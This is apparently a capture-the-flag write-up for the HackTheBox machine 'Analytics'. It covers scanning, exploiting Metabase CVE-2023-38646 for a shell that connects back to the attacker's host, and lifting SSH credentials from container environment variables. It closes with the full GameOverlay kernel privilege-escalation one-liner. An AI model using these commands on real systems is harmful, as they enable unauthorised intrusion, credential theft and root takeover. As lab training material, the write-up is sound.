---
title: Analytics
published: true
layout: post
---

<br />

---------------
Analytics is an easy difficulty Linux machine with exposed HTTP and SSH services. Enumeration of the website reveals a Metabase instance, which is vulnerable to Pre-Authentication Remote Code Execution ([CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)), which is leveraged to gain a foothold inside a Docker container. Enumerating the Docker container we see that the environment variables set contain credentials that can be used to SSH into the host. Post-exploitation enumeration reveals that the kernel version that is running on the host is vulnerable to GameOverlay, which is leveraged to obtain root privileges.

<br />

<iframe style="aspect-ratio: 16 / 9; width: 65%; display: block; margin: auto;" src="https://www.youtube.com/embed/nPaZz_MxZG0?si=NQM9t_0XH6Z5GIgb" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<br />

---------------------------------------------------

<br />

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS -sU 10.10.11.233 -p- -T4 --min-rate 5000 -oN all_ports.txt --open -n -Pn
```

![](/assets/Analytics/1.png)
<br />
<br />
<br />

There are **2 open ports**:
+ **22/tcp**
+ **80/tcp**

<br />
Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.11.233 -p 22,80 -T4 --min-rate 5000 -oX open_ports.xml -oN open_ports.txt --version-all -n -Pn -A
```

![](/assets/Analytics/2.png)
<br />
<br />
<br />

We can see that the services correspond to:
+ **22/tcp OpenSSH 8.9p1**
+ **80/tcp nginx 1.18.0**

<br />

We can also see a **hostname**, so we will add it to our ***/etc/hosts* file**:

```bash
echo "10.10.11.233 analytical.htb" | sudo tee --append /etc/hosts
```

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.11.233 -p 22,80 -T4 --min-rate 5000 --script="vuln and safe or intrusive and safe or discovery" -oN vulns.txt -oX vulns.xml -n -Pn
```

<br />

The scan reports nothing.

<br />

------

<br />
### Foothold

This machine's foothold is very **easy and straightforward**, however we will have to make **assumptions**.

<br />

Initial enumeration of the website revealed a login panel, which is located under a subdomain, ***data.analytical.htb***, we will add it to our /etc/hosts file:
```bash
echo "10.10.11.233 data.analytical.htb" | sudo tee --append /etc/hosts
```

<br />

By visiting the login website, we will discover a Metabase instance:

![](/assets/Analytics/3.png)
<br />
<br />
<br />

After trying some NoSQL injection, I **searched for an exploit** for this software, and find one that works:
```bash
searchsploit Metabase
```
![](/assets/Analytics/4.png)
<br />
<br />
<br />

This exploit leverages **CVE-2023-38646**, which essentially require  two HTTP requests to be exploited:
+ /api/session/properties
+ /api/setup/validate

<br />

The first one allows us to get a **setup token**, and the second one sends  a **payload in JSON format that executes commands**.

<br />

We just have to execute it to get a **webshell**:
```bash
python3 51797.py -u http://data.analytical.htb --lhost 10.10.16.10 --lport 4444 --sport 55555
```
![](/assets/Analytics/5.png)
<br />
<br />
<br />

However, after some enumeration, we can see that **we are in a container**, this is due to the existence of a ***/.dockerenv* file** and the **hostname**:

```bash
hostname
ls -la /.dockerenv
```
![](/assets/Analytics/6.png)
<br />
<br />
<br />

Following with our enumeration, we can discover some **credentials** in the **environmental variables**:
```bash
printenv
```
![](/assets/Analytics/7.png)
<br />
<br />
<br />

With this in mind an no *metalytics* user in this container, we can try to connect through **SSH** and **print the user flag**:
```bash
ssh metalytics@analytical.htb
```
![](/assets/Analytics/8.png)
<br />
<br />
<br />

------

<br />
### Privilege Escalation

The privilege escalation is simple, but we have to take a deep look into **version numbers**.

<br />

Enumerating Linux we discovered the kernel version:

```bash
uname -r
```

![](/assets/Analytics/9.png)
<br />
<br />
<br />

Searching for this version number revealed an [exploit](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629) created by g1vi called **Game Over(lay)** that leverages **CVE-2023-2640** and **CVE-2023-32629**:

![](/assets/Analytics/10.png)
<br />
<br />
<br />

This exploit is actually a **one-liner** that we can execute to **gain root privileges** and **print the flag**:
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```
![](/assets/Analytics/11.png)
<br />
<br />
<br />
